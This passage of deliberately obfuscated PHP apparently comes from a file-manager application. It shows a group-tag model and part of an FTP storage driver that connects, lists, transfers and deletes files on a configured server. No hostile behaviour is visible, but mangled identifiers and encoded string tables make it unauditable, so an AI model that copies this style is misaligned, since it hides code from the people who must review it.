$ÌÎØ’¡¤ = array_to_keyvalue($ÌÎØ’¡¤, $ÔºÍ¼”Ç[506], $ÔºÍ¼”Ç[405]); $¦˜‚ä¯í = !empty($ÌÎØ’¡¤[$’‹­å‰ß]) ? $ÌÎØ’¡¤[$’‹­å‰ß] : !1; if ($¦˜‚ä¯í) { if (!$ÌÎØ’¡¤[$¿·ˆ…¬]) { $ÌÎØ’¡¤[$¿·ˆ…¬] = Model($ÔºÍ¼”Ç[822])->groupRootAdd($¿·ˆ…¬); } $¯úÁˆÂ = $ÌÎØ’¡¤[$¿·ˆ…¬]; $áÜ¶‰ºÔ = array($ÔºÍ¼”Ç[500] => $¦˜‚ä¯í); $ÌÎØ’¡¤ = Model($ÔºÍ¼”Ç[822])->where($áÜ¶‰ºÔ)->field($ÔºÍ¼”Ç[1915])->select(); if (!$ÌÎØ’¡¤) { $ÌÎØ’¡¤ = array(); } Model($ÔºÍ¼”Ç[822])->moveClearAuth = !1; foreach ($ÌÎØ’¡¤ as $ğÉ®€ÑÛ) { $˜‰‚ ¦Õ = $ğÉ®€ÑÛ[$ÔºÍ¼”Ç[413]] == $ÔºÍ¼”Ç[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÔºÍ¼”Ç[822])->move($ğÉ®€ÑÛ[$ÔºÍ¼”Ç[405]], $¯úÁˆÂ, $˜‰‚ ¦Õ); } Model($ÔºÍ¼”Ç[822])->moveClearAuth = !0; $áÜ¶‰ºÔ = array($ÔºÍ¼”Ç[414] => 2, $ÔºÍ¼”Ç[506] => $’‹­å‰ß); $ÀÅ²—Û = array($ÔºÍ¼”Ç[506] => $¿·ˆ…¬); Model($ÔºÍ¼”Ç[1916])->where($áÜ¶‰ºÔ)->save($ÀÅ²—Û); Model($ÔºÍ¼”Ç[1917])->where($áÜ¶‰ºÔ)->save($ÀÅ²—Û); } $this->_changeChildLevel($ôÚ¶šÁğ[$’‹­å‰ß], $ôÚ¶šÁğ[$¿·ˆ…¬], !0); $this->where(array($ÔºÍ¼”Ç[500] => $’‹­å‰ß))->save(array($ÔºÍ¼”Ç[500] => $¿·ˆ…¬)); $this->_clearChildrenCache($ôÚ¶šÁğ[$¿·ˆ…¬]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($ÅËç”Éô) { $Ñ“¾“ïì =& $_SERVER[Æ š¦İÈ]; return array($Ñ“¾“ïì[1918] => array($ÅËç”Éô[0], $Ñ“¾“ïì[1919]), $Ñ“¾“ïì[1920] => array($ÅËç”Éô[0], $Ñ“¾“ïì[1921])); } protected function get($ÃóÕÍ¿) { $®±È·äŒ =& $_SERVER[Æ š¦İÈ]; $…Àì‡†¸ = Model($®±È·äŒ[524])->metaGet($ÃóÕÍ¿, $®±È·äŒ[1922]); $ÉµıõŠ­ = json_decode($…Àì‡†¸, !0); return $ÉµıõŠ­ ? $ÉµıõŠ­ : array($®±È·äŒ[1923] => $®±È·äŒ[89], $®±È·äŒ[366] => array()); } protected function set($Ğ’˜—Úï, $ö¬úòÌ¼) { $ğ«³›é­ =& $_SERVER[Æ š¦İÈ]; $ö¬úòÌ¼ = $ö¬úòÌ¼ ? $ö¬úòÌ¼ : array($ğ«³›é­[1923] => $ğ«³›é­[89], $ğ«³›é­[366] => array()); Model($ğ«³›é­[524])->metaSet($Ğ’˜—Úï, $ğ«³›é­[1922], json_encode($ö¬úòÌ¼)); return Model($ğ«³›é­[524])->metaSet($Ğ’˜—Úï, $ğ«³›é­[1922], json_encode($ö¬úòÌ¼)); } protected function getByTagID($ÜÀæµıı, $»ÜŠÃÖ×) { $ó¤¼ÚĞû =& $_SERVER[Æ š¦İÈ]; if (!$ÜÀæµıı || !$»ÜŠÃÖ×) { return !1; } if (!Model($ó¤¼ÚĞû[524])->getInfoSimple($ÜÀæµıı)) { return !1; } $«£şœØô = $this->get($ÜÀæµıı); if (!$«£şœØô || !isset($«£şœØô[$ó¤¼ÚĞû[366]])) { return !1; } $ª—‘§¤“ = array_find_by_field($«£şœØô[$ó¤¼ÚĞû[366]], $ó¤¼ÚĞû[403], $»ÜŠÃÖ×); return is_array($ª—‘§¤“) ? $ª—‘§¤“ : !1; } public function listSource($ş÷¬¾ú, $‘¸´Œ¨Å) { $ßÒöÔ±ğ =& $_SERVER[Æ š¦İÈ]; if ($‘¸´Œ¨Å && !is_array($‘¸´Œ¨Å)) { $‘¸´Œ¨Å = array($‘¸´Œ¨Å); } $ öÚŠ£û = $this->listData($ş÷¬¾ú); $›Œ¿´³Ñ = array(); foreach ($ öÚŠ£û as $–»…¨Ü§) { $¨§Èûš = $–»…¨Ü§[$ßÒöÔ±ğ[78]]; if (!$¨§Èûš) { continue; } if (!isset($›Œ¿´³Ñ[$¨§Èûš])) { $›Œ¿´³Ñ[$¨§Èûš] = array(); } $›Œ¿´³Ñ[$¨§Èûš][] = $–»…¨Ü§[$ßÒöÔ±ğ[429]]; } $©Â¬—î = array(); foreach ($›Œ¿´³Ñ as $»Û¸œÇ› => $‹¬˜õ †) { $ÅÒôÎÛß = !0; if (!$‘¸´Œ¨Å) { $©Â¬—î[] = $»Û¸œÇ›; continue; } foreach ($‘¸´Œ¨Å as $îÈäà¸) { if (!in_array($îÈäà¸, $‹¬˜õ †)) { $ÅÒôÎÛß = !1; break; } } if ($ÅÒôÎÛß) { $©Â¬—î[] = $»Û¸œÇ›; } } if (!$©Â¬—î) { return array(); } $Ó–õ÷–Ô = array($ßÒöÔ±ğ[420] => array($ßÒöÔ±ğ[421], $©Â¬—î), $ßÒöÔ±ğ[506] => $ş÷¬¾ú, $ßÒöÔ±ğ[414] => SourceModel::TYPE_GROUP); $ë²†²å© = Model($ßÒöÔ±ğ[1316])->listSource($Ó–õ÷–Ô); if (!$ë²†²å© || count($©Â¬—î) == $ë²†²å©[$ßÒöÔ±ğ[363]][$ßÒöÔ±ğ[364]]) { return $ë²†²å©; } $¨¦óçñ‹ = array(); $ä½´àÁ€ = array_to_keyvalue($ë²†²å©[$ßÒöÔ±ğ[77]], $ßÒöÔ±ğ[12], $ßÒöÔ±ğ[405]); $Š’®ªÂÜ = array_to_keyvalue($ë²†²å©[$ßÒöÔ±ğ[76]], $ßÒöÔ±ğ[12], $ßÒöÔ±ğ[405]); $şª×êí = array_merge($Š’®ªÂÜ, $ä½´àÁ€); foreach ($©Â¬—î as $¨§Èûš) { if (!in_array($¨§Èûš, $şª×êí)) { $¨¦óçñ‹[] = $¨§Èûš; } } if ($¨¦óçñ‹) { $this->removeBySource($ş÷¬¾ú, $¨¦óçñ‹); } return $ë²†²å©; } protected function listData($€µãßìË) { $Ê¾´§À =& $_SERVER[Æ š¦İÈ]; $òÉÇê°® = array($Ê¾´§À[1635] => 0, $Ê¾´§À[485] => array($Ê¾´§À[1924], 0), $Ê¾´§À[425] => $Ê¾´§À[1925] . $€µãßìË); $ÍÛ·ğÆû = $Ê¾´§À[1926]; $åèÊ‹ÀÂ = $this->field($ÍÛ·ğÆû)->where($òÉÇê°®)->order($Ê¾´§À[1927])->select(); return $åèÊ‹ÀÂ ? $åèÊ‹ÀÂ : array(); } protected function addToTag($ĞÂéììĞ, $±»³· º, $ä¾Ã”Ü×) { $é·ä’Ë“ =& $_SERVER[Æ š¦İÈ]; if (!$this->getByTagID($ĞÂéììĞ, $ä¾Ã”Ü×) || !$±»³· º) { return !1; } if (!Model($é·ä’Ë“[822])->pathInfo($±»³· º)) { return !1; } $ÊÆø»å = array($é·ä’Ë“[1635] => 0, $é·ä’Ë“[485] => $ä¾Ã”Ü×, $é·ä’Ë“[424] => $±»³· º, $é·ä’Ë“[425] => $é·ä’Ë“[1928] . $ĞÂéììĞ, $é·ä’Ë“[423] => $é·ä’Ë“[12], $é·ä’Ë“[1816] => 0); if ($this->where($ÊÆø»å)->find()) { return !1; } return $this->add($ÊÆø»å); } protected function removeFromTag($›‹¸şü, $º»¼§ò£, $â‚¹üŠª) { $À¦ÇÏ¡À =& $_SERVER[Æ š¦İÈ]; if (!$this->getByTagID($›‹¸şü, $â‚¹üŠª) || !$º»¼§ò£) { return !1; } if (is_array($º»¼§ò£)) { $º»¼§ò£ = array($À¦ÇÏ¡À[7], $º»¼§ò£); } $¼¯µ‚ˆ = array($À¦ÇÏ¡À[1635] => 0, $À¦ÇÏ¡À[485] => $â‚¹üŠª, $À¦ÇÏ¡À[425] => $À¦ÇÏ¡À[1928] . $›‹¸şü, $À¦ÇÏ¡À[424] => $º»¼§ò£); return $this->where($¼¯µ‚ˆ)->delete(); } protected function removeByTag($“ŞÄªóê, $‡ØéÛ¾) { $ï¦¤ãøÃ =& $_SERVER[Æ š¦İÈ]; if (!$this->getByTagID($“ŞÄªóê, $‡ØéÛ¾)) { return !1; } $ß¹¡­ëÉ = array($ï¦¤ãøÃ[1635] => 0, $ï¦¤ãøÃ[485] => $‡ØéÛ¾, $ï¦¤ãøÃ[425] => $ï¦¤ãøÃ[1928] . $“ŞÄªóê); return $this->where($ß¹¡­ëÉ)->delete(); } protected function removeBySource($¬„Æ®», $‚¡Äß…†) { $ŸïŠ‹‘¢ =& $_SERVER[Æ š¦İÈ]; if (!$¬„Æ®» || !$‚¡Äß…†) { return !1; } if (is_array($‚¡Äß…†)) { $‚¡Äß…† = array($ŸïŠ‹‘¢[7], $‚¡Äß…†); } $’¼å„¤ = array($ŸïŠ‹‘¢[1635] => 0, $ŸïŠ‹‘¢[424] => $‚¡Äß…†, $ŸïŠ‹‘¢[485] => array($ŸïŠ‹‘¢[1005], 0), $ŸïŠ‹‘¢[425] => $ŸïŠ‹‘¢[1928] . $¬„Æ®»); return $this->where($’¼å„¤)->delete(); } } goto cì¯¹´¯”; Cš£ÆÍñçƒ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($İã«É¤ß) { parent::__construct(); if (count($İã«É¤ß) > 0) { $this->_init($İã«É¤ß); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($½œÎóË) { $«Éê¸Àø =& $_SERVER[Æ š¦İÈ]; global $config; $this->appCharset = $config[$«Éê¸Àø[1353]]; $this->systemCharset = $config[$«Éê¸Àø[1354]]; if (isset($½œÎóË[$«Éê¸Àø[1355]]) && $½œÎóË[$«Éê¸Àø[1355]]) { $this->systemCharset = $½œÎóË[$«Éê¸Àø[1355]]; } } public function iconvApp($íèæãÎ´) { return $this->iconvTo($íèæãÎ´, $this->systemCharset, $this->appCharset); } public function iconvSystem($­ÆÛôıî) { return $this->iconvTo($­ÆÛôıî, $this->appCharset, $this->systemCharset); } public function getPathOuter($É¤×¸âÅ) { $”¼Ê¼Èü =& $_SERVER[Æ š¦İÈ]; $¾ò³È° = $this->iconvApp($this->pathBase); $É¤×¸âÅ = $this->iconvApp($É¤×¸âÅ); if (substr($¾ò³È°, 0, 2) == $”¼Ê¼Èü[1356]) { $¾ò³È° = BASIC_PATH . substr($¾ò³È°, 2); } if (substr($É¤×¸âÅ, 0, 2) == $”¼Ê¼Èü[1356]) { $É¤×¸âÅ = BASIC_PATH . substr($É¤×¸âÅ, 2); } $¾ò³È° = KodIO::clear($¾ò³È°); $É¤×¸âÅ = KodIO::clear($É¤×¸âÅ); $É¤×¸âÅ = substr($É¤×¸âÅ, strlen($¾ò³È°)); if (empty($this->pathDriver)) { return $É¤×¸âÅ; } return $this->pathDriver . $”¼Ê¼Èü[8] . ltrim($É¤×¸âÅ, $”¼Ê¼Èü[8]); } private function _init($ú÷´ÍÚø = array()) { $ğû‹É½Ò =& $_SERVER[Æ š¦İÈ]; if (!function_exists($ğû‹É½Ò[1357])) { throw new Exception(LNG($ğû‹É½Ò[1358])); } $this->config = $ú÷´ÍÚø; $this->charsetReset($ú÷´ÍÚø); foreach ($ú÷´ÍÚø as $§±¶Ş => $Üæ€Å¯ò) { if (isset($this->{$§±¶Ş})) { $this->{$§±¶Ş} = $Üæ€Å¯ò; } } return $this->_login($ú÷´ÍÚø); } private function _login($÷÷´Ÿ¹›) { $õ¶ˆğÑ =& $_SERVER[Æ š¦İÈ]; static $§Š¦ô†£ = array(); $Òê×üÄÈ = md5(json_encode($÷÷´Ÿ¹›)); if (isset($§Š¦ô†£[$Òê×üÄÈ])) { foreach ($§Š¦ô†£[$Òê×üÄÈ] as $¦¸§úËÛ => $€«é¶û¼) { $this->{$¦¸§úËÛ} = $€«é¶û¼; } return !0; } $„Ş¼¡›Ë = parse_url(trim($this->server, $õ¶ˆğÑ[8])); $this->host = $„Ş¼¡›Ë[$õ¶ˆğÑ[176]]; $‡Á•¤¬ü = isset($„Ş¼¡›Ë[$õ¶ˆğÑ[175]]) && $„Ş¼¡›Ë[$õ¶ˆğÑ[175]] == $õ¶ˆğÑ[1359] ? !0 : !1; $this->scheme = $‡Á•¤¬ü ? $õ¶ˆğÑ[1360] : $õ¶ˆğÑ[1361]; $this->port = isset($„Ş¼¡›Ë[$õ¶ˆğÑ[177]]) ? $„Ş¼¡›Ë[$õ¶ˆğÑ[177]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ò›öŸãÄ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $õû©®ÏÕ = $this->pasv == $õ¶ˆğÑ[89] ? !0 : !1; @ftp_pasv($this->connect, $õû©®ÏÕ); $§Š¦ô†£[$Òê×üÄÈ] = array($õ¶ˆğÑ[1362] => $this->connect, $õ¶ˆğÑ[176] => $this->host, $õ¶ˆğÑ[175] => $this->scheme, $õ¶ˆğÑ[177] => $this->port); return $ò›öŸãÄ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ËÍïÅùñ, $Ë„Ç…¥Ì = '', $‰„ç‡Æè = REPEAT_RENAME) { if ($this->setContent($ËÍïÅùñ, $Ë„Ç…¥Ì)) { return $this->getPathOuter($ËÍïÅùñ); } return !1; } public function mkdir($š‰êöµ¤, $û÷àÑŞ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $š‰êöµ¤ = $this->iconvSystem($š‰êöµ¤); if ($this->_isFolder($š‰êöµ¤) || @ftp_mkdir($this->connect, $š‰êöµ¤)) { return $this->getPathOuter($š‰êöµ¤); } if (!$this->mkdir($this->pathFather($š‰êöµ¤))) { return !1; } if ($š‰êöµ¤ = @ftp_mkdir($this->connect, $š‰êöµ¤)) { return $this->getPathOuter($š‰êöµ¤); } return !1; } public function copyFile($Åãû“ç, $Î±ÌºüÍ) { if (!$this->_isconn()) { return !1; } $øìãÆ³È = $this->pathThis($this->iconvSystem($Åãû“ç)); $œÑ¥›©ı = $this->tempFile($øìãÆ³È); $œõØœĞ‹ = $this->iconvApp($œÑ¥›©ı); $this->download($Åãû“ç, $œõØœĞ‹); $¤Äµ³¡Ï = $this->upload($Î±ÌºüÍ, $œõØœĞ‹); $this->tempFileRemve($œÑ¥›©ı); return $¤Äµ³¡Ï; } public function moveFile($Ïäñ­¯ƒ, $ØÁı­ÒÒ) { if (!$this->_isconn()) { return !1; } $Ïäñ­¯ƒ = $this->iconvSystem($Ïäñ­¯ƒ); $ØÁı­ÒÒ = $this->iconvSystem($ØÁı­ÒÒ); $Ãë†î = @ftp_rename($this->connect, $Ïäñ­¯ƒ, $ØÁı­ÒÒ); return $Ãë†î ? $this->getPathOuter($ØÁı­ÒÒ) : !1; } public function delFile($ùûÔ”¬Â) { if (!$this->_isconn()) { return !1; } $ùûÔ”¬Â = $this->iconvSystem($ùûÔ”¬Â); return @ftp_delete($this->connect, $ùûÔ”¬Â); } public function delFolder($Œ‡€„Ÿ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ßİîÅ†‡ = $àÇá÷˜ = array(); $this->fileList($Œ‡€„Ÿ, $ßİîÅ†‡, $àÇá÷˜, !0); $this->listItemCache = !0; foreach ($àÇá÷˜ as $Ù‰™»¸Ü) { $¹Ì§É“³ = $this->iconvSystem($Ù‰™»¸Ü[$_SERVER[Æ š¦İÈ][32]]); $îÕÎ£»³ = @ftp_delete($this->connect, $¹Ì§É“³); if (!$îÕÎ£»³) { return !1; } } foreach ($ßİîÅ†‡ as $¹Ì§É“³) { $¹Ì§É“³ = $this->iconvSystem($¹Ì§É“³); $îÕÎ£»³ = @ftp_rmdir($this->connect, $¹Ì§É“³); if (!$îÕÎ£»³) { return !1; } } $Œ‡€„Ÿ = $this->iconvSystem($Œ‡€„Ÿ); return @ftp_rmdir($this->connect, $Œ‡€„Ÿ); } public function rename($óû©ñò†, $üñÖô‚Ù) { $ŠîÛãÊô =& $_SERVER[Æ š¦İÈ]; if (!$this->_isconn()) { return !1; } $Œ“º– = $this->fileNameAuto($this->pathFather($óû©ñò†), $üñÖô‚Ù); $Œ“º– = $this->iconvSystem($Œ“º–); $óû©ñò† = $this->iconvSystem($óû©ñò†); $›Ğ¨£Ø” = $this->pathFather($óû©ñò†); $ëô±şğı = rtrim($›Ğ¨£Ø”, $ŠîÛãÊô[8]) . $ŠîÛãÊô[8] . $Œ“º–; $˜ËŠŒùÇ = @ftp_rename($this->connect, $óû©ñò†, $ëô±şğı); $ëô±şğı = $this->iconvApp($ëô±şğı); return $˜ËŠŒùÇ ? $this->getPathOuter($ëô±şğı) : !1; } private function folderInfo($¨¸Ø¿Ôì, $ÄØÒò«® = false) { $ûíøË Ã =& $_SERVER[Æ š¦İÈ]; $™›£úíá = array($ûíøË Ã[32] => $this->pathThis($¨¸Ø¿Ôì), $ûíøË Ã[78] => $this->getPathOuter($ûíøË Ã[8] . $¨¸Ø¿Ôì), $ûíøË Ã[33] => $ûíøË Ã[79]); if ($ÄØÒò«®) { return $™›£úíá; } $™›£úíá[$ûíøË Ã[195]] = $™›£úíá[$ûíøË Ã[86]] = 0; $™›£úíá[$ûíøË Ã[196]] = $™›£úíá[$ûíøË Ã[197]] = !0; return $™›£úíá; } private function fileInfo($¦ôä¸¯, $Š¦ïèÕ™ = false, $ƒåã¤ = array()) { $Ÿ·ßÕ‰§ =& $_SERVER[Æ š¦İÈ]; $íØŒ´ = array($Ÿ·ßÕ‰§[32] => $this->pathThis($¦ôä¸¯), $Ÿ·ßÕ‰§[78] => $this->getPathOuter($Ÿ·ßÕ‰§[8] . $¦ôä¸¯), $Ÿ·ßÕ‰§[33] => $Ÿ·ßÕ‰§[194], $Ÿ·ßÕ‰§[80] => isset($ƒåã¤[$Ÿ·ßÕ‰§[80]]) ? $ƒåã¤[$Ÿ·ßÕ‰§[80]] : 0, $Ÿ·ßÕ‰§[169] => $this->ext($¦ôä¸¯)); if ($Š¦ïèÕ™) { return $íØŒ´; } $íØŒ´[$Ÿ·ßÕ‰§[195]] = $íØŒ´[$Ÿ·ßÕ‰§[86]] = 0; $íØŒ´[$Ÿ·ßÕ‰§[196]] = $íØŒ´[$Ÿ·ßÕ‰§[197]] = !0; $†ë°œ‹ = $this->iconvSystem($¦ôä¸¯); $íØŒ´[$Ÿ·ßÕ‰§[86]] = @ftp_mdtm($this->connect, $†ë°œ‹); if (empty($ƒåã¤)) { $ƒåã¤ = $this->objectMeta($¦ôä¸¯); if (!$ƒåã¤) { return $íØŒ´; } } $íØŒ´[$Ÿ·ßÕ‰§[80]] = $ƒåã¤[$Ÿ·ßÕ‰§[80]]; return $íØŒ´; } public function size($ÑÁÔ¨¶”) { $‹Ğõõ¤ = $this->objectMeta($ÑÁÔ¨¶”); return $‹Ğõõ¤ ? $‹Ğõõ¤[$_SERVER[Æ š¦İÈ][80]] : 0; } public function info($Æ´‘õŠ‡) { if ($this->isFile($Æ´‘õŠ‡)) { return $this->fileInfo($Æ´‘õŠ‡, 0); } else { if ($this->isFolder($Æ´‘õŠ‡)) { return $this->folderInfo($Æ´‘õŠ‡); } } return !1; } private function fileList($ê„š •‰, &$úôºì›¦, &$ğæÉ©¾, $¬¼ø¸Š = false) { $Ú™…’Ü¾ =& $_SERVER[Æ š¦İÈ]; $ê„š •‰ = $this->iconvSystem($ê„š •‰); if (!$this->isFolder($ê„š •‰)) { return !1; } @ftp_chdir($this->connect, $Ú™…’Ü¾[8]); $ê„š •‰ = rtrim($ê„š •‰, $Ú™…’Ü¾[8]) . $Ú™…’Ü¾[8]; check_abort(); $Æí®œ·£ = $this->listItemCache === !1 ? !1 : !0; $ŸÎ˜ ş‚ = @ftp_rawlist($this->connect, $ê„š •‰); if (!$ŸÎ˜ ş‚) { $ŸÎ˜ ş‚ = array(); } $òª¹Æ„ü = array($Ú™…’Ü¾[10] => 1, $Ú™…’Ü¾[1363] => 1); foreach ($ŸÎ˜ ş‚ as $¿—Â²ËÒ) { $©ĞèÆÃò = $this->_listItem($¿—Â²ËÒ); if ($©ĞèÆÃò[0] == $Ú™…’Ü¾[756]) { continue; } $™‹µöéÛ = $©ĞèÆÃò[8]; if (empty($™‹µöéÛ) && $™‹µöéÛ !== $Ú™…’Ü¾[192] || isset($òª¹Æ„ü[$™‹µöéÛ])) { continue; } $™‹µöéÛ = $this->iconvApp($ê„š •‰ . ltrim($™‹µöéÛ, $Ú™…’Ü¾[8])); $ÌÆÍÉÈÓ = array($Ú™…’Ü¾[32] => $™‹µöéÛ, $Ú™…’Ü¾[33] => $Ú™…’Ü¾[194], $Ú™…’Ü¾[80] => $©ĞèÆÃò[4]); if (substr($¿—Â²ËÒ, 0, 1) == $Ú™…’Ü¾[1364]) { $ÌÆÍÉÈÓ[$Ú™…’Ü¾[33]] = $Ú™…’Ü¾[79]; $ÌÆÍÉÈÓ[$Ú™…’Ü¾[80]] = 0; } $šş’²ÕÍ = $ÌÆÍÉÈÓ[$Ú™…’Ü¾[33]] == $Ú™…’Ü¾[79] ? !0 : !1; if ($Æí®œ·£) { $this->cacheMethod($Ú™…’Ü¾[200], $™‹µöéÛ, $šş’²ÕÍ); $this->cacheMethod($Ú™…’Ü¾[201], $™‹µöéÛ, $ÌÆÍÉÈÓ); } if ($šş’²ÕÍ) { $úôºì›¦[] = $™‹µöéÛ; if ($¬¼ø¸Š) { $this->fileList($™‹µöéÛ, $úôºì›¦, $ğæÉ©¾, $¬¼ø¸Š); } continue; } $ğæÉ©¾[] = $ÌÆÍÉÈÓ; } if ($Æí®œ·£) { $this->cacheMethod($Ú™…’Ü¾[200], $ê„š •‰, !0); } } private function _listItem($”üä¡—à) { if (empty($”üä¡—à)) { return array(); } $ç¾³±ı¤ = preg_split($_SERVER[Æ š¦İÈ][1365], $”üä¡—à); if (count($ç¾³±ı¤) <= 9) { return $ç¾³±ı¤; } $ç¾³±ı¤[8] = trim(substr($”üä¡—à, strpos($”üä¡—à, $ç¾³±ı¤[7]) + strlen($ç¾³±ı¤[7]))); return array_splice($ç¾³±ı¤, 0, 9); } public function listPath($½Öı°ã«, $¬¯Ù Œ = false) { $ŸêÌ„Ğğ =& $_SERVER[Æ š¦İÈ]; if (!$this->_isconn()) { return !1; } $æ¥‹‚ëõ = $şä…êŸ¼ = array(); $this->fileList($½Öı°ã«, $æ¥‹‚ëõ, $şä…êŸ¼); foreach ($æ¥‹‚ëõ as $°Œ¹çÄÜ => $Ì„¿°Üç) { $æ¥‹‚ëõ[$°Œ¹çÄÜ] = $this->folderInfo($Ì„¿°Üç, $¬¯Ù Œ); } foreach ($şä…êŸ¼ as $°Œ¹çÄÜ => $Ì„¿°Üç) { $şä…êŸ¼[$°Œ¹çÄÜ] = $this->fileInfo($Ì„¿°Üç[$ŸêÌ„Ğğ[32]], $¬¯Ù Œ, $Ì„¿°Üç); } return array($ŸêÌ„Ğğ[77] => $æ¥‹‚ëõ, $ŸêÌ„Ğğ[76] => $şä…êŸ¼); } public function has($Ìè¯¬¼Œ, $é¾ÄÚ× = false, $á’İÅ º = true) { $¾©ƒºòÉ =& $_SERVER[Æ š¦İÈ]; $â¬ÕŸ„ğ = $«³‚Å«ˆ = array(); $‡Ô„ª§ğ = $é¾ÄÚ× ? !0 : !1; $this->fileList($Ìè¯¬¼Œ, $â¬ÕŸ„ğ, $«³‚Å«ˆ, $‡Ô„ª§ğ); if ($é¾ÄÚ×) { return array($¾©ƒºòÉ[204] => count($«³‚Å«ˆ), $¾©ƒºòÉ[205] => count($â¬ÕŸ„ğ)); } if ($á’İÅ º) { if (count($«³‚Å«ˆ)) { return !0; } } else { if (count($â¬ÕŸ„ğ)) { return !0; } } return !1; } public function listAll($ÎÙü¦¼û) { $óŞÆ×ù× =& $_SERVER[Æ š¦İÈ]; if (!$this->_isconn()) { return !1; } $Ÿãû÷» = $Ûº›Š = array(); $this->fileList($ÎÙü¦¼û, $Ÿãû÷», $Ûº›Š, !0); $¼ğŠ—Ê = array(); foreach ($Ûº›Š as $ÅßâîŠ) { $¼ğŠ—Ê[$ÅßâîŠ[$óŞÆ×ù×[32]]] = $ÅßâîŠ[$óŞÆ×ù×[80]]; } foreach ($Ÿãû÷» as $ÅßâîŠ) { if (is_string($ÅßâîŠ)) { $¼ğŠ—Ê[$ÅßâîŠ] = 0; } } return $this->listAllFiles($ÎÙü¦¼û, array_keys($¼ğŠ—Ê), $¼ğŠ—Ê); } public function getContent($öÌÏëï‘) { if (!$this->_isconn()) { return !1; } $öÌÏëï‘ = $this->iconvSystem($öÌÏëï‘); return $this->fileSubstr($öÌÏëï‘); } public function setContent($çßÇÅ–ı, $ĞõÔ˜ËÄ = '') { if (!$this->_isconn()) { return !1; } $°ßì°Çş = $this->pathThis($this->iconvSystem($çßÇÅ–ı)); $â¤·÷ŸÑ = $this->tempFile($°ßì°Çş); file_put_contents($â¤·÷ŸÑ, $ĞõÔ˜ËÄ); $¤Š»¶À¶ = $this->upload($çßÇÅ–ı, $this->iconvApp($â¤·÷ŸÑ)); $this->tempFileRemve($â¤·÷ŸÑ); return $¤Š»¶À¶; } public function fileSubstr($Ú“Íë‚, $«ÓÎÀœØ = 0, $ı¯áé…ª = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ú“Íë‚, $«ÓÎÀœØ, $ı¯áé…ª); } private function ftpRequest($ø˜—ª¥, $¬«ı·Ó© = 0, $…ù–µÒş = false) { $ø˜—ª¥ = $this->iconvSystem($ø˜—ª¥); $æù«’»Æ = $this->scheme . $this->host . $_SERVER[Æ š¦İÈ][4] . $this->port; $ØæË¹áŸ = curl_init(); curl_setopt($ØæË¹áŸ, CURLOPT_URL, $æù«’»Æ . $this->pathEncode($ø˜—ª¥)); curl_setopt($ØæË¹áŸ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($…ù–µÒş) { $–¤»îüõ = $¬«ı·Ó© + $…ù–µÒş - 1; curl_setopt($ØæË¹áŸ, CURLOPT_RANGE, "{$¬«ı·Ó©}\55{$–¤»îüõ}"); } curl_setopt($ØæË¹áŸ, CURLOPT_RETURNTRANSFER, 1); $¼ëñìÚ = curl_exec($ØæË¹áŸ); curl_close($ØæË¹áŸ); return $¼ëñìÚ; } public function upload($È’áçÀ, $Ú±ú¹ª , $£İôæËİ = false, $Ç‚ÏÊ¿ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($È’áçÀ))) { return !1; } $È’áçÀ = $this->iconvSystem($È’áçÀ); $Ú±ú¹ª  = $this->iconvSystem($Ú±ú¹ª ); $¾±‚£“ = ftp_nb_put($this->connect, $È’áçÀ, $Ú±ú¹ª , FTP_BINARY); while ($¾±‚£“ == FTP_MOREDATA) { $¾±‚£“ = ftp_nb_continue($this->connect); } if ($¾±‚£“ != FTP_FINISHED) { return !1; } return $this->getPathOuter($È’áçÀ); } public function download($ú›Ù¼½‘, $Ğé³˜÷™ = '') { if (!$this->_isconn()) { return !1; } $¤ÚÃ—ûÖ = $this->pathFather($Ğé³˜÷™); if (!IO::mkdir($¤ÚÃ—ûÖ)) { return !1; } $ú›Ù¼½‘ = $this->iconvSystem($ú›Ù¼½‘); $Ğé³˜÷™ = $this->iconvSystem($Ğé³˜÷™); $­ö‰İ‹¶ = ftp_nb_get($this->connect, $Ğé³˜÷™, $ú›Ù¼½‘, FTP_BINARY); while ($­ö‰İ‹¶ == FTP_MOREDATA) { $­ö‰İ‹¶ = ftp_nb_continue($this->connect); } if ($­ö‰İ‹¶ != FTP_FINISHED) { return !1; } return $this->iconvApp($Ğé³˜÷™); } public function exist($ÁÂú­ÌÕ) { return $this->isFile($ÁÂú­ÌÕ) || $this->isFolder($ÁÂú­ÌÕ); } public function isFile($… Ö—³ã) { return !$this->isFolder($… Ö—³ã) && $this->objectMeta($… Ö—³ã); } public function isFolder($¬îã¦¹) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][200], $¬îã¦¹); } protected function objectMeta($‘¥•Æú„) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][201], $‘¥•Æú„); } protected function _objectMeta($›€£¹‡Î) { $û‰ö©®ô =& $_SERVER[Æ š¦İÈ]; if ($›€£¹‡Î == $û‰ö©®ô[12] || $›€£¹‡Î == $û‰ö©®ô[8]) { return array(); } if (!$this->_isconn()) { return !1; } $›€£¹‡Î = $this->iconvSystem($›€£¹‡Î); $ÓâÔøı´ = array($û‰ö©®ô[32] => $this->iconvApp($›€£¹‡Î), $û‰ö©®ô[33] => $û‰ö©®ô[194], $û‰ö©®ô[80] => 0); @ftp_chdir($this->connect, $û‰ö©®ô[8]); $ÆÎ–îå = @ftp_size($this->connect, $›€£¹‡Î); if ($ÆÎ–îå != -1) { $ÓâÔøı´[$û‰ö©®ô[80]] = $ÆÎ–îå; } else { $ÖÚ”ÆßŠ = @ftp_chdir($this->connect, $›€£¹‡Î); if (!$ÖÚ”ÆßŠ) { return !1; } 